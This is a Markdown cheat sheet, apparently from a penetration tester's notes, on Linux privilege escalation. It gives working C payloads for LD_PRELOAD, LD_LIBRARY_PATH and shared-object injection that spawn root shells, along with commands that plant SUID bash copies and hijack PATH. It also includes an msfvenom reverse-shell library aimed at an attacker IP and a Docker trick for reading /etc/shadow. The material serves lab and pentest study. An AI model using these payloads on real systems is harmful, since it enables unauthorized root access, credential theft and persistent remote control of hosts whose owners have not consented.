# [PrivEsc with Meterpreter](../../../../Tools/Metasploit/README.md#Linux-PrivEsc)
# [See Linux Enumeration](../../../../Tools/Shells/Linux/README.md#System-Information)

# Potential Tricks
###### /bin/bash is a SUID binary
```bash
/bin/bash -p
```
###### Copy /bin/bash to /tmp
```bash
cp /bin/bash /tmp # Note that the copy is owned by the current user.
chmod +xs /tmp/bash
/tmp/bash
```

# CronJobs
##### CronJobs - PATH Environment Variable
```bash
cat /etc/crontab
# IF CronJobs includes a <file>.sh script and PATH includes user directory at start of path.

# Create <file>.sh in directory specified int he PATH.
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash

# Make sure that the file is executable:
chmod +x <file>.sh

# Run rootbash to gain root access.
/tmp/rootbash -p
```

# PATH Environment Variable
##### Alternate PATH Environment Variable - THM from Kenobi
```bash
find / -perm -u=s -type f -exec ls -l {} \; 2> /dev/null
-rwsr-xr-x 1 root root 8880 Sep  4  2019 /usr/bin/menu # Calls other commands
/usr/bin/menu
# /usr/bin/menu appears to be a user defined menu, to call other commands.
# strings /usr/bin/menu to see if it calls commands with full paths.
strings /usr/bin/menu
# Returns:
curl -I localhost
uname -r
ifconfig
# /usr/bin/menu does not use full paths and executes as root.
# Copy a shell to /tmp/ replacing the name of one of the above commands.
# The menu will execute as root, launching a root shell.
cp /bin/bash /tmp/ifconfig
chmod +x /tmp/ifconfig # set permission
export PATH=/tmp:$PATH # set path so that /usr/bin/menu runs command from /tmp and not actual location
/usr/bin/menu
```

# SUID Binaries
##### Known SUID Binaries
```bash
/bin/ping
/bin/su
/bin/mount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chsh
```

# SUDO
##### Common Sudo Binaries to Establish root Shells
```bash
less (!sh)
more (!sh)
Vi/Vim (:!sh)
nmap (--interactive + !sh)
ftp (!sh)
gdb (!sh)
python
Perl
lrb
lua
```
##### Common Sudo Binaries to Execute Commands
```bash
man -P "id" man
man -P "cat /etc/shadow" man
```
##### Docker
[dockerevil](https://github.com/pyperanger/dockerevil)

##### Sudo - Environment Variables - LD_PRELOAD
```c
/* File: preload.c */
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
[preload.c](Files/preload.c)
```bash
# Compile C code and save as payload to run before desires sudo -l program.
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
sudo -l
sudo LD_PRELOAD=/tmp/preload.so <sudo -l program-name-here>
```

##### Sudo - Environment Variables - LD_LIBRARY_PATH
```c
/* File: */
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
[envvar.c](Files/envvar.c)
```bash
sudo -l
# Get list of libraries used by desired program
# ldd <sudo -l program>
ldd /usr/sbin/apache2
# Compile C code and save to /tmp under name of the expected library.
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
# Set library path to where our hyjack code exists and call the sudo -l program.
sudo LD_LIBRARY_PATH=/tmp apache2
```

# Restricted Shells
##### Escape with Vi/Vim
```bash
Vi/Vim (:!sh)
```
##### Escape with Find
```bash
find /home/<Username> -name <Exisiting Filename> -exec /bin/sh \;
# If file exists, it executes the command.
```
##### Escape with Python
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```
##### Escape with Perl
```bash
perl -e 'exec "/bin/sh";'
```
##### Escape with SSH
```bash
ssh <Restricted Username>@<Target> -t "/bin/sh"
```
### Restricted Shells References
[Escape Restricted Shell](https://www.google.com/search?q=%22Restricted+shell%22+++%22pentesting%22&oq=%22Restricted+shell%22+++%22pentesting%22)

# Shared Object Libraries
### Using msfvenom
##### Determine Libraries Loaded by Binary
```bash
ldd <Binary Name>
```
##### Determine if Binary was Compiled with RPATH
```bash
objdump -x <Binary Name> | grep RPATH
```
##### Determine if Binary was Compiled with RUNPATH
```bash
objdump -x <Binary Name> | grep RUNPATH
```
##### Generate Reverse Shell, Shared Object Library
```bash
msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=<Attacker IP> LPORT=<Attacker Port> -f elf-so -o <Library Name>
# Transfer to the path indicated in RPATH or RUNPATH.
```

### Generated C Code
##### SUID / SGID Executables - Shared Object Injection
```c
/* File libcalc.c */
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```
[libcalc.c](Files/libcalc.c)
```bash
# First, execute the file and note that currently it displays a progress bar before exiting:
/usr/local/bin/suid-so
# Run strace on the file and search the output for open/access calls and for "no such file" errors:
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
# strace shows suid-so is trying to load /home/user/.config/libcalc.so.
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
/usr/local/bin/suid-so
```

### Shared Object Libraries References
[Static, Shared Dynamic and Loadable Linux Libraries](http://www.yolinux.com/TUTORIALS/LibraryArchives-StaticAndDynamic.html)

[Shared object library loading from writable location](https://www.mozilla.org/en-US/security/advisories/mfsa2013-87/)

[Shared Object Hijacking in Linux (Similar to "DLL Hijacking" in Windows)](https://bugzilla.mozilla.org/show_bug.cgi?id=1184466)

[Command Line Options](https://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_node/ld_3.html)

# Kernel Exploits
### Categories
[Arbitrary Code Execution](https://en.wikipedia.org/wiki/Arbitrary_code_execution)

[Buffer Overflows](https://en.wikipedia.org/wiki/Buffer_overflow)

[Memory Corruption](https://en.wikipedia.org/wiki/Memory_corruption)

[Denial Of Service](https://en.wikipedia.org/wiki/Denial-of-service_attack)

[Race Conditions](https://en.wikipedia.org/wiki/Race_condition)

### PrivEsc Kernel Vulnerabilities
[Dirty Cow](https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails)

[Stack Clash](https://blog.qualys.com/vulnerabilities-threat-research/2017/06/19/the-stack-clash)

[DCCP Double-Free Privilege Escalation](https://www.exploit-db.com/exploits/41458)

[Race Condition Privilege Escalation](https://www.exploit-db.com/exploits/43345)

### [Linux Exploit Suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester)
```bash
perl Linux_Exploit_Suggester.pl -k <Kernel Version>
```

### Metasploit

### [Kernelpop](https://github.com/spencerdodd/kernelpop)
##### Run from Source
```bash
git clone https://github.com/spencerdodd/kernelpop
cd kernelpop
python kernelpop.py || python3 kernelpop.py
```
##### Run from Binary
```bash
git clone https://github.com/spencerdodd/kernelpop
cd kernelpop
./create_executable.sh
./kernelpop
```

### Kernel Exploits References
[Linux Kernel](https://en.wikipedia.org/wiki/Linux_kernel)

[Arbitrary Code Execution](https://en.wikipedia.org/wiki/Arbitrary_code_execution)

[Buffer Overflows](https://en.wikipedia.org/wiki/Buffer_overflow)

[Memory Corruption](https://en.wikipedia.org/wiki/Memory_corruption)

[Denial Of Service](https://en.wikipedia.org/wiki/Denial-of-service_attack)

[Race Conditions](https://en.wikipedia.org/wiki/Race_condition)

[Dirty Cow](https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails)

[Stack Clash](https://blog.qualys.com/vulnerabilities-threat-research/2017/06/19/the-stack-clash)

[DCCP Double-Free Privilege Escalation](https://www.exploit-db.com/exploits/41458)

[Race Condition Privilege Escalation](https://www.exploit-db.com/exploits/43345)

[Exploit Suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester)

[Kernelpop](https://github.com/spencerdodd/kernelpop)

# UNIX Sockets
### Execute Commands through Docker as root
```bash
# Running Docker as non-root.
docker run -v /etc/shadow:/docker/hashedpasswords -d postgres
docker exec -ti {CONTAINER_ID} bash
# Now running inside of Docker as root.
cat /docker/hashedpasswords > /docker/output.txt
chmod +777 /docker/output.txt
cat /docker/output.txt
```

### UNIX Sockets References
[Docker](https://docs.docker.com/engine/install/linux-postinstall/)

[Docker Tips: about /var/run/docker.sock](https://betterprogramming.pub/about-var-run-docker-sock-3bfd276e12fd)

# Script Executing as root
```bash
cd /tmp
echo "/bin/bash" > ls
chmod +x ls
export PATH=/tmp:$PATH
cd ~
./script
```

# References
[0xsp Cheatsheet](https://0xsp.com/offensive/privilege-escalation-cheatsheet/)

[Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

[GTFOBins](https://gtfobins.github.io/)

[Hacktricks Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

[LXD](https://www.exploit-db.com/exploits/46978)

[mzfr - Linux Privilege escalation](https://blog.mzfr.me/posts/2020-02-1-linux-priv-esc/)